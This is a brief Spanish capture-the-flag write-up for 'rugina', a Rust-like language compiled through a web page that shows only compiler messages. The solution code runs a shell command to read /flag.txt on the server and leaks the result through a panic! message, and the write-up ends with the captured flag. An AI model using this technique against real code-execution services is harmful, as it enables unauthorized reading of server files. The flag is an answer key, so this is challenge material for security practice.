# rugina

Tenemos un compilador de "rugina", un lenguaje similar a Rust.

A medida que escribimos el compilador nos corrige si hacemos algo "Rust like" pero que no es valido en rugina. No se puede declarar una funcion normalmente, sino que es asi:
`func() {}` y no se puede usar `println!`.

Ademas aunque el codigo sea correcto y logres imprimir algo no se muestra. La pagina solo te permite visualizar los mensajes del compilador. Pero puedes usar `panic!` para forzar a que el compilador te devuelva el mensaje que deseas:

```
use std::process::Command;
principal() {
  let output = Command::new("cat").arg("/flag.txt")
              .output()
              .expect("Failed to execute command");
 let cmdout = String::from_utf8_lossy(&output.stdout);
 panic!("{}",cmdout)
}
```

<img width="1108" height="297" alt="2025-09-15-085408_1108x297_scrot" src="https://github.com/user-attachments/assets/7b5251d7-2433-4ddf-8760-9540300ca942" />

`ctf{73523e676b04e1c2db176d8035648893648b969f5ddf5ac40f8fc5b6c15d8692}`

